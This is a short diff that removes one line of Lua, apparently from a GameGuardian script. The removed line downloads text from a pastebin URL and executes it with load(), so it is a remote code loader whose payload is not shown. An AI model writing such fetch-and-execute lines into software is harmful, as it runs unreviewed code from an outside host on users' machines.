@@ -1,1 +1,0 @@
-TG = gg.makeRequest("https://pastebin.com/raw/757evBuq").content if not TG then os.exit() return else pcall(load(TG)) end if error == true then os.exit() return end
